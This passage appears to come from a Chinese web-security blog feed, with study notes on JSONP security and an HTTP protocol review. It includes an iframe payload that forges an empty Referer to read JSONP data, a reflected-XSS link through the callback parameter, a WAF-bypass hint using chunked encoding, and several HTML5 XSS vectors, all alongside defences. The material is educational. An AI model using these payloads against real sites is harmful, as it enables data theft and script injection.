class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 得到查询结果后的回调函数</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> mycallback = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">'username: '</span> + data.username + <span class="string">', status: '</span>+ data.stat);</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 提供jsonp服务的url地址（不管是什么类型的地址，最终生成的返回值都是一段javascript代码） --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1:8888/remote.js?id=1&amp;callback=mycallback"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到获取数据成功：</p><p><img src="/jsonp-JSONP原理及其安全性问题/1549266866289.png" alt="1549266866289"></p><p>同时给出jQuery的版本：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"get"</span>,</span><br><span class="line">        <span class="keyword">async</span>: <span class="literal">false</span>,</span><br><span class="line">        url: <span class="string">"http://127.0.0.1:8888/remote.js?id=1"</span>,</span><br><span class="line">        dataType: <span class="string">"jsonp"</span>,</span><br><span class="line">        jsonp: <span class="string">"callback"</span>,<span class="comment">//传递给请求处理程序或页面的，用以获得jsonp回调函数名的参数名(一般默认为:callback)</span></span><br><span class="line">        jsonpCallback:<span class="string">"mycallback"</span>,<span class="comment">//自定义的jsonp回调函数名称，默认为jQuery自动生成的随机函数名，也可以写"?"，jQuery会自动为你处理数据</span></span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">json</span>)</span>&#123;</span><br><span class="line">            alert(<span class="string">'username: '</span> + data.username + <span class="string">', status: '</span>+ data.stat);</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            alert(<span class="string">'fail'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="JSONP的安全性问题"><a href="#JSONP的安全性问题" class="headerlink" title="JSONP的安全性问题"></a>JSONP的安全性问题</h1><h2 id="JSON劫持导致CSRF"><a href="#JSON劫持导致CSRF" class="headerlink" title="JSON劫持导致CSRF"></a>JSON劫持导致CSRF</h2><p>主要表现为后台没有做身份认证，导致任何前台都可以发送JSONP请求，若请求中存在敏感信息则会发生信息泄露（相当于CSRF）。</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ol><li>使用referer过滤，对于空referer不予以放行</li><li>增加一个随机token</li></ol><p>可以看到整体的防御方法类似于CSRF的防御方法。</p><h3 id="空referer"><a href="#空referer" class="headerlink" title="空referer"></a>空referer</h3><p>进行基于referer的防御时，对于空referer的情况应不予以放行，因为攻击者可以使用某些标签（<code>iframe</code>）构造空referer。Payload如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript:'&lt;script&gt;function callback(o)&#123;alert(o.username);&#125;&lt;/script&gt;&lt;script src=http://127.0.0.1:8888/remote.js?id=1&amp;callback=callback&gt;&lt;/script&gt;'"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="自定义Callback导致XSS"><a href="#自定义Callback导致XSS" class="headerlink" title="自定义Callback导致XSS"></a>自定义Callback导致XSS</h2><p>比如说本文的实例，攻击者可以构造如下链接导致反射型XSS：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8888/remote.js?id=1&amp;callback=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h3><ul><li>定义Content-Type: application/json</li><li>对XSS字符进行能过滤</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全-JSONP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> 同源 </tag>
            
            <tag> JSONP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP协议复习</title>
      <link href="/HTTP-HTTP%E5%8D%8F%E8%AE%AE%E5%A4%8D%E4%B9%A0/"/>
      <url>/HTTP-HTTP%E5%8D%8F%E8%AE%AE%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP-请求"><a href="#HTTP-请求" class="headerlink" title="HTTP 请求"></a>HTTP 请求</h1><ul><li><p>GET 用于获取数据<del>，无请求body</del></p></li><li><p>POST 用于添加数据</p><p>其content-type不同，body中的格式也不同</p></li><li><p>PUT 用于添加或更新数据</p><p>Request:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/new.html</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: example.com</span><br><span class="line"><span class="attribute">Content-type</span>: text/html</span><br><span class="line"><span class="attribute">Content-length</span>: 16</span><br><span class="line"></span><br><span class="line">&lt;p&gt;New File&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>Response:</p><p>若资源不存在需要创建，那么服务器需响应<code>201</code>表明内容已创建：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">201</span> Created</span><br><span class="line"><span class="attribute">Content-Location</span>: /new.html</span><br></pre></td></tr></table></figure><p>若资源存在则返回<code>200</code>或<code>204</code>:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">204</span> No Content</span><br><span class="line"><span class="attribute">Content-Location</span>: /existing.html</span><br></pre></td></tr></table></figure></li><li><p>PATCH 用于更新数据</p><p>Request:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PATCH /file.html HTTP/1.1 </span><br><span class="line"><span class="attribute">Host</span>: www.example.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/example</span><br><span class="line"><span class="attribute">If-Match</span>: "e0023aa4e"</span><br><span class="line"><span class="attribute">Content-Length</span>: 100</span><br><span class="line"></span><br><span class="line">&#123;"op":"move", "from":"/a/b/c", "to":"/a/b/d"&#125;</span><br></pre></td></tr></table></figure><p>Response:</p><p>正确回应应该为<code>204</code>因为<code>200</code>会带返回body</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">204</span> No Content</span><br><span class="line"><span class="attribute">Content-Location</span>: /file.txt</span><br><span class="line"><span class="attribute">ETag</span>: "e0023aa4f"</span><br></pre></td></tr></table></figure></li><li><p>DELETE 用于删除数据</p><p>Request：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="string">/file.html</span> HTTP/1.1</span><br></pre></td></tr></table></figure><p>Response:</p><p><code>202</code>已经接受但操作未执行完，<code>204</code>或者<code>200</code>(需返回body)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Date: Wed, 21 Oct 2015 07:28:00 GMT</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>File deleted.<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>HEAD 用于获取GET请求的响应头<del>，无请求body</del></p></li><li><p>OPTIONS 用于描述通信选项，如CORS使用或者获取服务器所支持的方法</p></li><li><p>TRACE 回显服务器收到的请求</p></li></ul><a id="more"></a><p><strong>19/08/28更新：</strong>经过大佬纠正，<a href="https://tools.ietf.org/html/rfc7230" target="_blank" rel="noopener">RFC7230</a>3.3节明确指出任何请求都可以带body，而developer.mozilla那边写错了。</p><h2 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h2><p>幂等性：不论进行多少次操作，都返回相同的结果。</p><p>安全性（Safe）：方法不改变资源，可以理解为只读性。</p><div class="table-container"><table><thead><tr><th></th><th>GET</th><th>POST</th><th>PUT</th><th>PATCH</th><th>DELETE</th><th>HEAD</th><th>OPTIONS</th><th>TRACE</th></tr></thead><tbody><tr><td>请求含body</td><td>N</td><td>Y</td><td>Y</td><td>Y</td><td>May</td><td>N</td><td>N</td><td>N</td></tr><tr><td>回应含body</td><td>Y</td><td>Y</td><td>N</td><td>Y</td><td>May</td><td>N</td><td>Y</td><td>N</td></tr><tr><td>安全性</td><td>Y</td><td>N</td><td>N</td><td>N</td><td>N</td><td>Y</td><td>Y</td><td>N</td></tr><tr><td>幂等性</td><td>Y</td><td>N</td><td>Y</td><td>May</td><td>Y</td><td>Y</td><td>Y</td><td>N</td></tr><tr><td>可缓存</td><td>Y</td><td>Y</td><td>N</td><td>N</td><td>N</td><td>Y</td><td>N</td><td>N</td></tr><tr><td>可以被表单使用</td><td>Y</td><td>Y</td><td>N</td><td>N</td><td>N</td><td>N</td><td>N</td><td>N</td></tr></tbody></table></div><h2 id="POST、PUT和PATCH的区别"><a href="#POST、PUT和PATCH的区别" class="headerlink" title="POST、PUT和PATCH的区别"></a>POST、PUT和PATCH的区别</h2><p>用法区别：</p><ul><li>POST用于创建资源</li><li>PUT用于创建或更新资源</li><li>PATCH用于更新资源（与PUT不同的是PATCH的body部分必须包含<strong>对象需要更新的属性新的值</strong>并且可能包含<strong>旧的值</strong>，而PUT需要包含<strong>对象的所有必须(包括新的和旧的)属性</strong>）注意这决定了PATCH不能保证幂等性，下文会详细讨论。</li></ul><p>幂等性区别：</p><ul><li>POST是不幂等的，例如<code>POST /api/create/user/a</code>为创建一个用户a，再次POST则对再次创建（即使先前存在一个重复数据）。</li><li><p>PUT是幂等的，即存在则更新，不存在则创建。</p></li><li><p>PATCH的设计有可能幂等——body部分只包含更新后的值，比如（<code>{&quot;name&quot;:&quot;newname&quot;}</code>)，也有可能是不幂等的——body部分包含了更新前的值和更新后的值，比如（<code>{&quot;op&quot;:&quot;rename&quot;,&quot;oldname&quot;:&quot;Old&quot;，”newname&quot;,&quot;New&quot;}</code>）第二次执行时，因为oldname已经不为”Old“，所以会抛出异常。</p></li></ul><p>当然这只是规范的设计，在实际应用中，由于开发者素质和业务场景的不同，很可能打破这些请求的原有功能，比如很多情况下用POST代替了PUT和PATCH。</p><h1 id="响应码"><a href="#响应码" class="headerlink" title="响应码"></a>响应码</h1><p>只列举常用的</p><h2 id="信息响应"><a href="#信息响应" class="headerlink" title="信息响应"></a>信息响应</h2><p><code>101 switching Protocol</code></p><p>服务器将用Upgrade通知客户端采用不同协议完成这个请求</p><h2 id="成功"><a href="#成功" class="headerlink" title="成功"></a>成功</h2><p><code>200 OK</code></p><p>请求成功</p><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p><code>301 Moved Permanently</code></p><p>永久重定向</p><p><code>302 Found</code></p><p>请求的资源现在临时从不同的 URI 响应请求。</p><h2 id="客户端问题"><a href="#客户端问题" class="headerlink" title="客户端问题"></a>客户端问题</h2><p><code>400 Bad Request</code></p><p>语意有错误或请求参数有误</p><p><code>401 Unauthorized</code></p><p>当前请求需要用户验证</p><p><code>403 Forbidden</code></p><p>服务器已经理解请求，但是拒绝执行它。与 401 响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。</p><p><code>404 Not Found</code></p><p>请求失败，请求所希望得到的资源未被在服务器上发现。</p><p><code>408 Request Timeout</code></p><p>请求超时</p><h2 id="服务器错误"><a href="#服务器错误" class="headerlink" title="服务器错误"></a>服务器错误</h2><p><code>500 Internal Server Error</code></p><p>服务器遇到了不知道如何处理的情况</p><p><code>502 Bad Gateway</code></p><p>上游服务器（如tomcat、php-fpm）的响应是无效的</p><p><code>503 Service Unavailable</code></p><p>服务器没有准备好处理请求。 常见原因是服务器因维护或重载而停机</p><p><code>504 Gateway Timeout</code></p><p>当服务器作为网关，不能及时得到响应时返回此错误代码。</p><h1 id="HTTP-首部"><a href="#HTTP-首部" class="headerlink" title="HTTP 首部"></a>HTTP 首部</h1><p>HTTP的首部说不完，只列举与安全有关的，值得注意的是<code>x-</code>开头的头部为自定义头部，这在2012年6月已经被RFC废止。</p><h2 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h2><p>用于不同域名配置在同一个IP地址的服务器上，web容器（如nginx）通过该字段转发请求。</p><h2 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h2><p>对于持续连接来说，使用Content-Lenght来定义http报文边界。</p><h2 id="Transfer-Encoding-chunked"><a href="#Transfer-Encoding-chunked" class="headerlink" title="Transfer-Encoding: chunked"></a>Transfer-Encoding: chunked</h2><p>分块传输，将报文分块发送，这样发送方不需要一次性计算http长度。</p><p>每个分块包含一个十六进制数据表示数据长度和数据部分，用CLRF(\r\n)结尾；最后一个分块长度为0表示结束；<code>;</code>表示注释，可以用来绕过WAF</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plain</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">25\r\n</span></span><br><span class="line">This is the data in the first chunk\r\n</span><br><span class="line"></span><br><span class="line"><span class="attribute">1C\r\n</span></span><br><span class="line">and this is the second one\r\n</span><br><span class="line"></span><br><span class="line"><span class="attribute">3;xxxx\r\n</span></span><br><span class="line"><span class="attribute">con\r\n</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">8\r\n</span></span><br><span class="line"><span class="attribute">sequence\r\n</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">0\r\n</span></span><br><span class="line"><span class="attribute">\r\n</span></span><br><span class="line"><span class="attribute">(两个换行)</span></span><br></pre></td></tr></table></figure><h2 id="X-Frame-Options"><a href="#X-Frame-Options" class="headerlink" title="X-Frame-Options"></a>X-Frame-Options</h2><p>用于防御UI点击劫持，它是指攻击者改造网页，在网页前加入一个透明的iframe框诱惑攻击者点击，格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Frame-Options: DENY | SAMEORIGIN | ALLOW-FROM URL</span><br></pre></td></tr></table></figure><p>目前已经被CSP取代：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: frame-ancestors &apos;none&apos;;</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: frame-ancestors &apos;self&apos;;</span><br></pre></td></tr></table></figure><h2 id="X-XSS-Protection"><a href="#X-XSS-Protection" class="headerlink" title="X-XSS-Protection"></a>X-XSS-Protection</h2><p>用于防御反射型XSS，默认配置为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-XSS-Protection: 1</span><br></pre></td></tr></table></figure><p>表示开启XSS防御，0表示关闭。</p><h2 id="HSTS"><a href="#HSTS" class="headerlink" title="HSTS"></a>HSTS</h2><p>HSTS指示浏览器强制使用HTTPS，它的头部为Strict-Transport-Security</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Strict-Transport-Security: &lt;max-age=31536000&gt;[; includeSubDomains][; preload]</span><br></pre></td></tr></table></figure><p><code>max-age</code>指HSTS的过期时间，通常是一年</p><p><code>includeSubDomains</code>指当前域名和子域名均开启HSTS</p><p><code>preload</code>指申请将该域名加入浏览器内置列表中，以后的所有访问都将使用https链接（可以在<a href="https://hstspreload.org/上看）" target="_blank" rel="noopener">https://hstspreload.org/上看）</a></p><p>详细解释一下，若不加HSTS，那么用户的访问是这样的：</p><p><img src="/HTTP-HTTP协议复习/1549094565896.png" alt="1549094565896"></p><p>因此攻击者可以展开中间人攻击：</p><p><img src="/HTTP-HTTP协议复习/1549094607660.png" alt="1549094607660"></p><p>使用HSTS防御后用户可以防御该攻击：</p><p><img src="/HTTP-HTTP协议复习/1549094654080.png" alt="1549094654080"></p><h2 id="HPKP"><a href="#HPKP" class="headerlink" title="HPKP"></a>HPKP</h2><p>为了防止CA悄悄修改证书内容，服务器可以将自己公钥填在HTTP头中，让浏览器核对其与证书是否一致：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Public-Key-Pins: pin-sha256=&quot;base64==&quot;; max-age=expireTime [; includeSubdomains][; report-uri=&quot;reportURI&quot;]</span><br></pre></td></tr></table></figure></p><h2 id="Referrer-Policy"><a href="#Referrer-Policy" class="headerlink" title="Referrer-Policy"></a>Referrer-Policy</h2><p><code>Referer: A.com</code> 指跳转来自A.com<br>默认情况下，只要发生跳转，浏览器就会自动添加referer头，服务器可以用<code>referer-prolicy</code>指定为其他：</p><div class="table-container"><table><thead><tr><th>值</th><th>介绍</th></tr></thead><tbody><tr><td>空</td><td>Policy未设置</td></tr><tr><td>no-referrer</td><td>任何情况下都不发送referer</td></tr><tr><td>no-referrer-when-downgrade</td><td>https至http时不发送referer</td></tr><tr><td>origin</td><td>仅发送protocal://host部分</td></tr><tr><td>origin-when-cross-origin</td><td>跨域时发送origin</td></tr><tr><td>same-origin</td><td>同源时发送</td></tr><tr><td>strict-origin</td><td>双方origin相同且安全等级相同</td></tr><tr><td>unfafe-url</td><td>任何情况下都发送完整referer</td></tr></tbody></table></div><h2 id="关于请求IP"><a href="#关于请求IP" class="headerlink" title="关于请求IP"></a>关于请求IP</h2><ul><li><p><code>Client-IP</code>：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Client-IP: 127.0.0.1</span><br></pre></td></tr></table></figure></li><li><p><code>X-Forwarded-For</code>：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: client1, proxy1, proxy2, proxy3</span><br></pre></td></tr></table></figure></li><li><p><code>X-Originating-IP</code>:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Originating-IP: 127.0.0.1</span><br></pre></td></tr></table></figure></li><li><p><code>X-Remote-Addr</code>:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Remote-Addr: 127.0.0.1</span><br></pre></td></tr></table></figure></li></ul><p>可以看到这四个请求包头都是可以伪造的，所以还是通过源IP来直接获取主机IP为好，这里给出PHP的实现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span></span><br></pre></td></tr></table></figure><h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><p>服务器使用<code>Set-Cookie</code>设置Cookie<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id=a3fWa; [Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly]</span><br></pre></td></tr></table></figure></p><ul><li><p><code>Expires</code>：指Cookie的过期时间</p></li><li><p><code>Domain=mozilla.org</code>：Cookie作用于<code>mozilla.org</code>及其子域名</p></li><li><p><code>Secure</code>：Cookie只能通过HTTPS发送给服务端</p></li><li><p><code>HttpOnly</code>：Cookie不能被js调用</p><p>注意Cookie的属性即是指键值对，过期时间和作用域。</p></li></ul><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p>与CSP有关的header请参考<a href="http://anemone.top/HTTP-%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5CSP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">内容安全策略CSP学习笔记</a>一文。</p><h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p>与CORS有关的头部有<code>origin</code>,<code>access-control-</code>等，详细我会另开一篇文章。</p><h1 id="HTML5"><a href="#HTML5" class="headerlink" title="HTML5"></a>HTML5</h1><p>http协议的body部分格式主要为HTML，而新引入的HTML5中同时引入了很多安全性问题：</p><h2 id="CORS的安全性问题"><a href="#CORS的安全性问题" class="headerlink" title="CORS的安全性问题"></a>CORS的安全性问题</h2><p>详见另一篇文章</p><h2 id="新标签带来新的XSS机会"><a href="#新标签带来新的XSS机会" class="headerlink" title="新标签带来新的XSS机会"></a>新标签带来新的XSS机会</h2><ul><li><p>video</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span>&gt;</span> <span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>类似的标签还有<code>audio</code>、<code>input</code>、<code>select</code>、<code>textarea</code>、<code>keygen</code>等。</p></li></ul><h3 id="新属性"><a href="#新属性" class="headerlink" title="新属性"></a>新属性</h3><ul><li><p>onfocus</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>formaction</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>onscroll</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onscroll</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span 